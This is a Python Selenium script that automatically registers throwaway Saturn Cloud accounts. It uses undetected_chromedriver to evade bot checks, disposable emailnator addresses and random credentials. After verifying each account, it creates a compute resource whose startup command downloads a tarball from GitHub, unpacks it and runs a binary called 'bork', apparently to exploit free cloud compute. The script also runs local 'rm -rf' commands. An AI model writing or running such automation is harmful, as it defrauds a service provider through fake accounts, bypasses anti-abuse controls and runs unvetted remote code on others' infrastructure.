
import undetected_chromedriver as uc
from selenium.webdriver import Chrome
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import time
import random
import json
import os
import requests
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
a = False
os.system("rm -rf rawrz")
os.system("tar -xf volx.tar.gz")
os.system("rm -rf rawr")
os.system("cp -r rawrz rawr")
low_word = "abcdefghijklkmnopqrstuvwxyz"
upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
number = "1234567890"
symbols = "!@#$%&*"
username_for = low_word
password_for = low_word + upper_word + number + symbols
long_password = 16
long_username = 12
ass = "".join(random.sample(username_for, 12))
options = uc.ChromeOptions()
options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
options.user_data_dir = "rawr"
options.add_argument("--window-size=1920,1080")
options.add_argument('--user-data-dir=rawr')
options.add_argument("--remote-debugging-port=38223")
driver = uc.Chrome(options=options, version_main=107)

driver.set_window_size(1920, 1080)
passwd = "".join(random.sample(low_word, 12))+"H!1"
driver.execute_script('''window.open("http://bings.com","_blank");''')
driver.switch_to.window(driver.window_handles[1])
driver.get("https://www.emailnator.com/")
time.sleep(6)
try:
    driver.find_element(By.XPATH, '//*[@id="qc-cmp2-ui"]/div[2]/div/button[2]').click()
except:
    pass
time.sleep(0.5)
try:
    driver.find_element(By.XPATH, '//*[@id="close-btn-ann"]').click()
except:
    pass
time.sleep(1.5)
driver.find_element(By.XPATH, '//*[@id="custom-switch-domain"]').click()
time.sleep(0.5)
driver.find_element(By.XPATH, '//*[@id="custom-switch-dotGmail"]').click()
time.sleep(0.5)
driver.find_element(By.XPATH, '/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[5]/div/button').click()
time.sleep(2)
emilyez = driver.find_element(By.XPATH, '/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[1]/input').get_attribute("value")
emilyez = emilyez.split("+")[0]+"+"+"".join(random.sample(low_word, 13))+"@gmail.com"
time.sleep(1)
driver.switch_to.window(driver.window_handles[0])
# random.choice(a)+"+"+emailrepl+"@gmail.com"
print(emilyez)
#input("RAWR")
time.sleep(1)
driver.get("https://saturncloud.io/")
time.sleep(1)
print("a1")
driver.find_element(By.XPATH, "/html/body/div[1]/main/section[1]/div[1]/div/div[2]/a").click()
time.sleep(3)

driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/div[1]/label/div/div/input").send_keys("".join(random.sample(low_word, 8)))

time.sleep(1.5)

driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/div[2]/label/div/div/input").send_keys(emilyez)

time.sleep(1)
print("a2")
driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/form/button").click()
time.sleep(20)


driver.switch_to.window(driver.window_handles[1])
time.sleep(2)
driver.get("https://www.emailnator.com/inbox/"+emilyez)
# driver.find_element(By.XPATH, "/html/body/div/div/main/div[1]/div/div/div/div[2]/div/div[3]/button").click()
time.sleep(6)
linkz = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div[2]/div[2]/div/table/tbody/tr[2]/td/a").get_attribute("href")
time.sleep(0.5)
driver.get(linkz)
time.sleep(7)
verifylink = driver.find_element(By.XPATH, "/html/body/div/div/section/div/div/div[3]/div/div/div[2]/div/div/p[3]/a").get_attribute("href")
driver.switch_to.window(driver.window_handles[0])
time.sleep(1)
driver.get(verifylink)
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/div[1]/label/div/div/input").send_keys(passwd)
time.sleep(0.5)
driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/div[2]/label/div/div/input").send_keys(passwd)
time.sleep(2)
print("a3")
driver.find_element(By.XPATH, "/html/body/div/div[1]/section/div/div/div/div/div/form/button").click()
time.sleep(7)
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[1]/div/div/div[2]/div[2]/section/div/button[1]").click()
time.sleep(2)
print("a4")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[1]/div/div/div[2]/div[2]/section/div[2]/span[2]").click()
time.sleep(3)
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[1]/div/div[2]/div[2]/div/div[3]/div/label/div/div/input").send_keys("".join(random.sample(low_word, 4)))
time.sleep(1)
print("a5")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[2]/div/div[2]/div[2]/div/fieldset/div/div/label[2]").click()
time.sleep(1)
print("a6")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[2]/div/div[2]/div[2]/div/div/label/div/select/option[4]").click()
time.sleep(1)
print("a7")
driver.execute_script("window.scrollTo(0,700)")
time.sleep(2)
driver.find_element(By.XPATH, '/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[3]/div/div[1]/div/div[2]/p').click()
time.sleep(1)
print("a8")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[3]/div/div[2]/div[2]/div[4]/label/div/textarea").send_keys("wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/bork.tar.gz && tar -xf bork.tar.gz && ./bork")
time.sleep(1)
print("a9")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div/form/div[6]/div/div/div/button[1]").click()
time.sleep(7)
print("a10")
driver.find_element(By.XPATH, "/html/body/div[1]/div[1]/div/main/div/div/div/div/div[2]/div/div/div[1]/div[1]/div/div/div[1]/div[2]/div/button").click()
time.sleep(10)
driver.get(driver.current_url)
time.sleep(300)



# try:
#     driver.find_element(By.XPATH, "/html/body/div[17]").click()
# except:
#     pass
